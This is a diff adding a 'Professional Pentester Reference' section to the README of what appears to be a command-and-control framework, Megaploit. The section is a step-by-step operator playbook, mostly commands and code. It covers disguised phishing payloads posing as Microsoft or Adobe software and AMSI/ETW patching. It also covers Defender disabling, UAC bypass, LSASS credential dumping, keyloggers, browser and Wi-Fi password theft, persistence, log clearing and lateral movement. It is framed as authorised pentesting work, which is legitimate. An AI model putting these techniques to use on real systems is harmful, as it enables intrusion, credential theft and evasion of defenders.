@@ -71,6 +71,19 @@
 - [Credential Store & Reporting](#credential-store--reporting)
 - [Architecture](#architecture)
 - [Running Tests](#running-tests)
+- [Professional Pentester Reference](#professional-pentester-reference)
+  - [Engagement Workflow](#engagement-workflow)
+  - [OPSEC Checklist](#opsec-checklist)
+  - [Payload Delivery Matrix](#payload-delivery-matrix)
+  - [Privilege Escalation Decision Tree](#privilege-escalation-decision-tree)
+  - [Credential Harvesting Priority Order](#credential-harvesting-priority-order)
+  - [Pivoting Techniques Compared](#pivoting-techniques-compared)
+  - [Evasion Stack](#evasion-stack)
+  - [Full Internal Network Engagement Example](#full-internal-network-engagement-example)
+  - [External Assessment Example](#external-assessment-example)
+  - [Active Directory Attack Chain](#active-directory-attack-chain)
+  - [Automation & Scripting](#automation--scripting)
+  - [Extending Megaploit](#extending-megaploit)
 
 ---
 
@@ -1320,3 +1333,615 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide. Quick reference:
 5. Open a pull request
 
 **Full documentation:** [josefifir.github.io/Megaploit](https://josefifir.github.io/Megaploit/)
+
+---
+
+## Professional Pentester Reference
+
+This section assumes you are comfortable with the basics and focuses on operator efficiency, OPSEC, chaining techniques, and real-world engagement workflows.
+
+---
+
+### Engagement Workflow
+
+A structured approach from initial access to reporting:
+
+```
+Phase 1 — Setup
+  python3 server.py -lh <VPN-IP> -p 443 --tls
+  megaploit » tls status                         # verify fingerprint
+  megaploit » engagement name "Client Corp — Internal Assessment Q2 2024"
+  megaploit » pipeline enable creds              # auto-harvest on every session
+  megaploit » pipeline enable recon
+
+Phase 2 — Initial Access  (choose delivery method, see payload matrix below)
+  megaploit » payload exe --out dropper.exe --pe-company "Microsoft" \
+                           --pe-product "Windows Defender" --upx --tls
+  # or: phishing → HTA / PS1 / oneliner_ps1
+  # or: exploit module → automated callback
+
+Phase 3 — Per-session immediately after callback
+  megaploit » use <N>
+  > sandbox_check               # verify not in AV sandbox before acting
+  > whoami_priv                 # assess token privileges
+  > sysinfo                     # OS version, arch, hostname
+  > ps                          # identify security tools running
+  > ifconfig                    # spot multi-homed hosts (pivot candidates)
+
+Phase 4 — Privilege Escalation  (see decision tree below)
+Phase 5 — Credential Harvesting  (see priority order below)
+Phase 6 — Lateral Movement + Pivoting  (see pivoting section below)
+Phase 7 — Objectives
+Phase 8 — Clean Up + Reporting
+  megaploit » self_destruct      # remove traces from each target
+  megaploit » report html engagement_report.html
+  megaploit » creds export creds_final.json
+  megaploit » loot browse
+```
+
+---
+
+### OPSEC Checklist
+
+Run this mentally before and after every action:
+
+**Before connecting:**
+- [ ] `tls auto` or `--tls` flag active — all traffic encrypted
+- [ ] `secret.key` is unique to this engagement (not reused from another)
+- [ ] `--allow-ip` set if you know the egress IP of the target network
+- [ ] Listener port looks legitimate (443, 80, 8443 blend better than 4444)
+- [ ] Agent payload has legitimate-looking PE metadata (`--pe-company`, `--pe-product`)
+- [ ] Agent uses `--sleep 30` or `--encoder sandbox_detect` to avoid sandbox detonation
+
+**During operations:**
+- [ ] Check `idle_time` before running noisy commands — is someone at the keyboard?
+- [ ] Check `active_windows` to see what the user has open
+- [ ] `patch_amsi` and `etw_patch` before running PowerShell-based tools
+- [ ] `sandbox_check` on first access to a new machine
+- [ ] `clear_logs` only after completing all work on that host (do it once, at the end)
+- [ ] Use `run_bg` for long-running commands to avoid blocking the channel
+- [ ] `timestomp <dropped_file> C:\Windows\System32\notepad.exe` on any dropped files
+- [ ] `hide_file <path>` on any agent/tool files left on disk
+
+**Before leaving a session:**
+- [ ] Remove tools uploaded during the session (`rm /tmp/linpeas.sh`)
+- [ ] If persistence is not required: `self_destruct`
+- [ ] If persistence is required: use `persist` with a believable name
+
+---
+
+### Payload Delivery Matrix
+
+Choose the right format for the situation:
+
+| Scenario | Format | Command |
+|---|---|---|
+| Phishing — user opens attachment | `exe` | `payload exe --out invoice.exe --pe-company "Adobe Inc" --pe-product "Acrobat Reader"` |
+| Phishing — macro in Word/Excel | `vba` | `payload vba --out macro.vba --sleep 10` |
+| Phishing — HTA file via web link | `hta` | `payload hta --out setup.hta --sleep 15` |
+| Initial shell via PowerShell paste | `oneliner_ps1` | `payload oneliner_ps1 --sleep 30` |
+| Internal network — Python available | `py_stealth` | `payload py_stealth --encoder etw_patch --out svc.py` |
+| Constrained target — no Python | `go_exe` | `payload go_exe --tls --out svchost.exe` |
+| Linux target | `go_elf` | `payload go_elf --tls --out .cache` |
+| Macro with sandbox delay | `vba` | `payload vba --sleep 60 --encoder sandbox_detect` |
+| Staged delivery (proxy/CDN in front) | `stage0` | `stage0 generate --start --out d.py` |
+| Firewall allows only HTTP/80 | WebSocket | `listener add 80 --http` then `payload py --tls` |
+| Only DNS outbound allowed | DNS | `listener add 53 --dns --zone c2.yourdomain.com` |
+
+**Encoder stacking for high-security targets:**
+
+```bash
+# Layer 1: Sandbox detection (kills agent if in VM/sandbox)
+# Layer 2: ETW patching (disables event tracing)
+# Layer 3: Comment noise (breaks static string signatures)
+# Layer 4: Variable randomisation (breaks code structure analysis)
+# Layer 5: Gzip+base64 (changes byte distribution, compresses)
+megaploit » payload py \
+    --encoder sandbox_detect \
+    --encoder etw_patch \
+    --encoder comment_spam \
+    --encoder varname_rand \
+    --encoder b64gzip \
+    --out final_payload.py
+```
+
+---
+
+### Privilege Escalation Decision Tree
+
+```
+Check current privileges first:
+  > whoami
+  > whoami_priv
+
+If already SYSTEM / root → skip to credential harvesting
+
+Windows — Standard user:
+  > uac_bypass cmd.exe           # fodhelper registry hijack (no UAC prompt)
+  → if successful: now high integrity
+
+Windows — Admin / high integrity:
+  > getsystem                    # 3-technique cascade → SYSTEM
+  → technique 1: named-pipe impersonation (most reliable)
+  → technique 2: SeDebugPrivilege token steal
+  → technique 3: unquoted service path
+  If getsystem fails:
+  > find_suid                    # look for misconfigured services
+  > token_steal                  # steal token from SYSTEM process
+  > dll_inject 4 C:\Temp\priv.dll  # inject into SYSTEM process
+
+Linux — Standard user:
+  > find_suid                    # SUID binaries (pkexec, vim, python3)
+  > sudo_sniff                   # capture next sudo password
+  > scheduled_tasks              # writable script run as root?
+  > services                     # weak service permissions?
+  > run_python import subprocess; print(subprocess.check_output(['sudo','-l'],text=True))
+
+Linux — After getsystem / sudo:
+  > run_python import os; os.setuid(0)   # confirm root
+  > hashdump                             # /etc/shadow
+```
+
+---
+
+### Credential Harvesting Priority Order
+
+Run these in order — each one takes seconds and has zero footprint:
+
+```bash
+# 1. Current user context (no elevation needed — always run first)
+> cred_vault          # Windows Credential Manager: RDP, VPN, generic creds
+> wifi_passwords      # saved Wi-Fi keys — often reused as domain passwords
+> browser_creds       # Chrome/Edge saved passwords + session cookies
+> ssh_harvest         # SSH private keys + known_hosts + shell history
+
+# 2. After UAC bypass / admin
+> kiwi credman        # Windows Credential Manager (more complete than cred_vault)
+> kiwi tickets        # Kerberos TGT/TGS — pass-the-ticket
+> keylog_start        # start background keylogger before escalating
+
+# 3. After SYSTEM
+> getsystem
+> hashdump            # SAM hive: all local account hashes
+> kiwi logonpasswords # LSASS dump: NTLM hashes + SHA1 for all logged-on users
+> kiwi sam            # SAM offline dump via RegSaveKey
+> kiwi lsa            # LSA secrets: service accounts, domain cached creds
+
+# 4. Domain controller only
+> kiwi all            # run every kiwi module
+> net_view            # enumerate all domain computers and shares
+```
+
+All creds are automatically saved to SQLite. Export later:
+
+```bash
+megaploit » creds show
+megaploit » creds search <hostname>
+megaploit » creds export loot_creds.json
+```
+
+---
+
+### Pivoting Techniques Compared
+
+| Technique | Command | Best for | Overhead |
+|---|---|---|---|
+| **Port forward** | `portfwd 8888 10.10.0.20 3389` | Single-service access (RDP, SSH) | Very low |
+| **SOCKS5 proxy** | `socks5` + proxychains | Routing all tools through pivot | Low |
+| **SSH dynamic tunnel** | `portfwd 2222 10.10.0.20 22` → `ssh -D 1080 user@target -p 2222` | Full tunnel, stable | Medium |
+| **Agent on internal host** | Deploy second agent to internal host via portfwd | Second C2 session on deeper host | None once deployed |
+| **Pivot routes** | `route add 10.10.0.0/16 1` | Document topology for post modules | None (metadata only) |
+
+**Pivot chaining example — 3 hops:**
+
+```
+Your machine
+  └─→ Session 1 (DMZ host, 192.168.1.50)
+        └─→ portfwd 2222 10.10.0.5 22
+              └─→ SSH to 10.10.0.5 → deploy agent → Session 2
+                    └─→ portfwd 3333 172.16.0.10 3389
+                          └─→ RDP to internal workstation
+```
+
+```bash
+# Step 1: from session 1, reach internal SSH host
+megaploit session(1) » portfwd 2222 10.10.0.5 22
+# Step 2: SSH from your machine through session 1 to internal host
+ssh root@192.168.1.50 -p 2222 "python3 -c 'exec(open(\"agent.py\").read())' &"
+# Step 3: second agent connects back → Session 2
+megaploit » use 2
+megaploit session(2) » portfwd 3333 172.16.0.10 3389
+# Step 4: RDP to deep internal workstation from your machine
+mstsc /v:192.168.1.50:3333
+```
+
+---
+
+### Evasion Stack
+
+Layer these techniques in order of increasing noise:
+
+**Layer 0 — Payload generation (before delivery)**
+```bash
+payload exe --pe-company "Microsoft Corporation" \
+            --pe-product "Windows Security Health Service" \
+            --pe-version "10.0.22621.2134" \
+            --pe-copyright "(C) Microsoft Corporation" \
+            --encoder sandbox_detect \
+            --encoder etw_patch \
+            --sleep 30 \
+            --upx \
+            --tls \
+            --out WindowsSecurityHealth.exe
+```
+
+**Layer 1 — On first execution (before doing anything else)**
+```bash
+> sandbox_check          # confirm not in AV sandbox
+> patch_amsi             # disable AMSI for this process
+> etw_patch              # disable ETW telemetry for this process
+> ps                     # identify EDR/AV processes (CrowdStrike, SentinelOne, etc.)
+```
+
+**Layer 2 — Staying hidden**
+```bash
+> hide_file <agent_path>           # set hidden attribute
+> timestomp <agent> <legit_file>   # clone timestamps
+> migrate <trusted_pid>            # move into explorer.exe / svchost.exe
+> beacon_sleep 300                 # reduce beacon frequency (less noisy)
+```
+
+**Layer 3 — Before credential operations**
+```bash
+> disable_defender                 # if endpoint allows registry writes
+> kill <av_pid>                    # last resort — extremely noisy
+```
+
+**Layer 4 — Cleaning up**
+```bash
+> clear_logs                       # wipe Windows event logs / Linux syslog
+> rm <any_uploaded_tools>          # delete artefacts
+> self_destruct                    # remove agent + persistence + keylog
+```
+
+---
+
+### Full Internal Network Engagement Example
+
+End-to-end walkthrough of a typical internal network pentest:
+
+```bash
+# ── Setup ────────────────────────────────────────────────────────────────────
+python3 server.py -lh 10.50.0.10 -p 443 --tls
+megaploit » engagement name "ACME Corp — Internal Pentest 2024"
+megaploit » pipeline enable creds
+megaploit » pipeline enable recon
+megaploit » tls status               # note fingerprint for report
+
+# ── Payload delivery (phishing / USB drop / initial access) ──────────────────
+megaploit » payload exe --tls --out SecurityUpdate.exe \
+    --pe-company "Microsoft Corporation" \
+    --pe-product "Windows Defender" \
+    --pe-version "4.18.2304.8" \
+    --encoder sandbox_detect --sleep 30 --upx
+
+# ── Session arrives — immediate triage ───────────────────────────────────────
+megaploit » use 1
+> sandbox_check              # verify not sandboxed
+> patch_amsi                 # disable AMSI
+> etw_patch                  # disable ETW
+> whoami_priv                # assess token privileges
+> ps | grep -i "crowd\|sentinel\|carbon\|defender\|cylance"  # find EDR
+
+# ── Privilege escalation ─────────────────────────────────────────────────────
+> uac_bypass cmd.exe         # bypass UAC if standard user
+> getsystem                  # escalate to SYSTEM
+
+# ── Credential harvest ───────────────────────────────────────────────────────
+> kiwi logonpasswords        # NTLM hashes from LSASS (needs SYSTEM)
+> kiwi sam                   # local account hashes
+> kiwi lsa                   # LSA secrets: service accounts
+> kiwi tickets               # Kerberos tickets
+> wifi_passwords             # saved Wi-Fi keys
+> browser_creds              # saved browser passwords
+> cred_vault                 # Windows Credential Manager
+
+# ── Persistence ──────────────────────────────────────────────────────────────
+> persist WindowsDefenderSvc SecurityUpdate.exe
+> kiwi wdigest               # enable cleartext caching for next logon
+
+# ── Network discovery ─────────────────────────────────────────────────────────
+> ifconfig                   # spot dual-homed interfaces
+> arp_scan 10.10.0.0/24      # find live hosts
+> net_view ACME.LOCAL        # enumerate domain
+> port_scan 10.10.0.5 22,80,135,139,443,445,1433,3389
+
+# ── Lateral movement ─────────────────────────────────────────────────────────
+> portfwd 4450 10.10.0.5 445         # reach DC's SMB
+megaploit » use exploits/windows/smb/smb_login_bruteforce
+megaploit » setopt RHOSTS 10.10.0.5
+megaploit » setopt USERNAME administrator
+megaploit » setopt PASSWORDS loot_creds.json  # use harvested creds
+megaploit » run
+
+# ── Domain controller ─────────────────────────────────────────────────────────
+megaploit » use 2                    # new session on DC
+> getsystem
+> kiwi all                           # full DC credential dump
+> net_view ACME.LOCAL                # full domain map
+> hashdump                           # shadow/SAM
+
+# ── Cleanup ───────────────────────────────────────────────────────────────────
+megaploit » sessions -c "clear_logs"  # clear logs on all sessions
+megaploit session(1) » self_destruct
+megaploit session(2) » self_destruct
+
+# ── Reporting ─────────────────────────────────────────────────────────────────
+megaploit » creds export final_creds.json
+megaploit » report html ACME_Internal_Pentest_2024.html
+megaploit » loot browse
+```
+
+---
+
+### External Assessment Example
+
+Attacking from the internet with no insider access:
+
+```bash
+# ── Reconnaissance ────────────────────────────────────────────────────────────
+# Use scanner modules for service discovery
+megaploit » use auxiliary/scanner/tcp_port
+megaploit » setopt RHOSTS acme-corp.com
+megaploit » setopt PORTS 21,22,25,80,443,1433,3389,8080,8443
+megaploit » run
+
+# Check for known CVEs on discovered services
+megaploit » use auxiliary/scanner/http_header_probe
+megaploit » setopt RHOSTS acme-corp.com
+megaploit » run
+
+# ── Web application attacks ───────────────────────────────────────────────────
+megaploit » use exploits/multi/http/sql_injection_login_bypass
+megaploit » setopt RHOSTS acme-corp.com
+megaploit » setopt TARGETURI /admin/login
+megaploit » run
+
+megaploit » use exploits/multi/http/wordpress_xmlrpc_bruteforce
+megaploit » setopt RHOSTS acme-corp.com
+megaploit » setopt USERNAME admin
+megaploit » setopt PASSWORDS /wordlists/rockyou.txt
+megaploit » run
+
+# ── CVE-based exploitation ────────────────────────────────────────────────────
+megaploit » use exploits/multi/http/log4shell_cve2021_44228
+megaploit » setopt RHOSTS acme-corp.com
+megaploit » setopt RPORT 8443
+megaploit » setopt LHOST <your-vps-ip>
+megaploit » check
+megaploit » run
+
+# ── After initial foothold ────────────────────────────────────────────────────
+megaploit » use 1
+> sysinfo
+> ifconfig          # where are we? cloud? on-prem?
+> ps                # what's running?
+> env               # cloud metadata, API keys, secrets
+> find_files / "*.env"
+> search / "AWS_ACCESS_KEY\|AZURE_CLIENT\|api_key"
+> cat /app/.env     # web app database credentials
+```
+
+---
+
+### Active Directory Attack Chain
+
+Systematic approach when you land on a Windows domain host:
+
+```bash
+# Step 1 — Establish context
+> whoami              # are we on a domain?
+> net_view            # enumerate domain — finds DCs
+> dns_query _ldap._tcp.ACME.LOCAL   # find all DCs
+
+# Step 2 — Kerberos attacks (from scanner modules, no session needed)
+megaploit » use auxiliary/scanner/kerberos_asrep_roast
+megaploit » setopt RHOSTS <DC-IP>
+megaploit » setopt DOMAIN ACME.LOCAL
+megaploit » run
+# → Crack AS-REP hashes offline: hashcat -m 18200 hashes.txt rockyou.txt
+
+megaploit » use auxiliary/scanner/kerberos_kerberoast
+megaploit » setopt RHOSTS <DC-IP>
+megaploit » run
+# → Crack TGS hashes: hashcat -m 13100 tgs.txt rockyou.txt
+
+# Step 3 — With cracked domain creds: lateral movement
+megaploit session(1) » run_as ACME\svc_sql Password1! "net user /domain"
+megaploit session(1) » run_as ACME\svc_sql Password1! "net group 'Domain Admins' /domain"
+
+# Step 4 — Pass-the-hash (with NTLM hash from kiwi)
+megaploit » use exploits/windows/smb/smb_login_bruteforce
+megaploit » setopt USERNAME administrator
+megaploit » setopt NTLM_HASH <hash-from-kiwi-logonpasswords>
+megaploit » run
+
+# Step 5 — On domain controller
+> kiwi lsa           # LSA secrets: DSRM password, trust account hashes
+> kiwi all           # complete domain credential dump
+> net_view ACME.LOCAL  # full forest/trust enumeration
+> reg query HKLM\SYSTEM\CurrentControlSet\Services  # check service account passwords
+```
+
+---
+
+### Automation & Scripting
+
+#### Resource scripts
+
+Run a batch of commands non-interactively:
+
+```bash
+# Create a resource script:
+cat > initial_recon.rc << 'EOF'
+sandbox_check
+patch_amsi
+etw_patch
+whoami_priv
+sysinfo
+ps
+ifconfig
+arp
+EOF
+
+# Run it:
+megaploit » resource initial_recon.rc
+```
+
+#### AutoRunScript for automated collection
+
+The most powerful automation: configure once, runs on every new session automatically.
+
+```json
+{
+  "global":  ["sandbox_check", "patch_amsi", "etw_patch", "whoami_priv", "sysinfo", "screenshot"],
+  "windows": ["installed_software", "startup_items", "scheduled_tasks", "active_windows"],
+  "linux":   ["find_suid", "services", "users", "env"],
+  "tags": {
+    "dc":     ["kiwi all", "net_view", "hashdump", "scheduled_tasks"],
+    "web":    ["find_files /var/www password", "find_files /etc nginx.conf", "env"],
+    "sql":    ["find_files / *.mdf", "installed_software", "services"],
+    "laptop": ["browser_creds all", "wifi_passwords", "keylog_start", "screenshot"]
+  }
+}
+```
+
+Save to `~/.megaploit_autorun.json`, then:
+
+```bash
+megaploit » autorun reload
+megaploit » autorun test 1    # preview what fires for session 1
+```
+
+#### Session broadcasting
+
+Run a command against every connected host at once:
+
+```bash
+megaploit » sessions -c whoami           # C2 command to all sessions
+megaploit » sessions -c patch_amsi       # patch AMSI on all sessions
+megaploit » sessions -c "keylog_start"   # start keylogger everywhere
+megaploit » broadcast id                 # raw shell command to all
+```
+
+#### Background jobs for long-running scans
+
+```bash
+megaploit session(1) » run_bg find / -name "*.pem" 2>/dev/null
+# job ID returned: job_abc123
+
+# Do other work...
+
+megaploit session(1) » job_result job_abc123
+```
+
+---
+
+### Extending Megaploit
+
+#### Writing a custom post module
+
+The fastest way to add a repeatable technique:
+
+```python
+# megaploit/modules/post/windows/gather/dump_lsass.py
+from megaploit.modules.base import AgentModule, ModuleType
+
+class DumpLsass(AgentModule):
+    name        = "post/windows/gather/dump_lsass"
+    description = "Create a full LSASS minidump via comsvcs.dll (no kiwi required)"
+    module_type = ModuleType.POST
+
+    def run(self, session=None):
+        self.validate()
+        sess = session or self.session
+        # Execute via LOLBin — comsvcs.dll MiniDump
+        pid_out = self._send("shell Get-Process lsass | Select-Object -ExpandProperty Id", sess)
+        pid = pid_out.strip()
+        self._send(
+            f'run_psh "rundll32 C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump {pid} C:\\\\Temp\\\\lsass.dmp full"',
+            sess
+        )
+        self._send("download C:\\Temp\\lsass.dmp", sess)
+        self._ok("LSASS dump saved to loot", pid=pid)
+        return self.results
+
+MODULE = DumpLsass
+```
+
+Run it:
+
+```bash
+megaploit session(1) » run post/windows/gather/dump_lsass
+```
+
+#### Writing a custom extension (injected at runtime)
+
+No restart, no redeployment — loaded into the live agent:
+
+```python
+# /tmp/lateral.py — upload and load during engagement
+import subprocess, base64
+
+def _wmi_exec(conn, args):
+    """WMI lateral movement: wmi_exec <target> <user> <pass> <cmd>"""
+    if len(args) < 4:
+        return "Usage: wmi_exec <target> <user> <pass> <cmd>"
+    target, user, pwd, cmd = args[0], args[1], args[2], " ".join(args[3:])
+    ps = (
+        f'$c=New-Object System.Management.ManagementClass(\\\\.\\\\{target}\\root\\cimv2:Win32_Process);'
+        f'$c.Create("{cmd}")'
+    )
+    out = subprocess.check_output(
+        ["powershell", "-ep", "bypass", "-c", ps], text=True, stderr=subprocess.STDOUT
+    )
+    return out
+
+HANDLERS = {"wmi_exec": _wmi_exec}
+```
+
+```bash
+megaploit session(1) » load_ext /tmp/lateral.py
+[+] Extension 'lateral' loaded — verbs: wmi_exec
+
+megaploit session(1) » wmi_exec 10.10.0.20 ACME\admin P@ssw0rd whoami
+```
+
+#### Custom TOML plugin for reusable operator shortcuts
+
+```toml
+# plugins/red_team.toml
+name = "red_team"
+version = "1.0"
+
+[[command]]
+name    = "quick_recon"
+kind    = "session"
+help    = "Rapid triage: patch AMSI, get sysinfo, screenshot, list processes"
+shell   = "patch_amsi && etw_patch && sysinfo && screenshot && ps"
+
+[[command]]
+name    = "nmap_pivot"
+kind    = "local"
+help    = "nmap_pivot <cidr> — scan CIDR through active session"
+shell   = "proxychains nmap -sT -p 22,80,135,139,443,445,3389,8080 {arg0}"
+timeout = 300
+```
+
+Drop the file in `plugins/`, then:
+
+```bash
+megaploit » plugins reload
+megaploit session(1) » quick_recon
+megaploit » nmap_pivot 10.10.0.0/24
+```
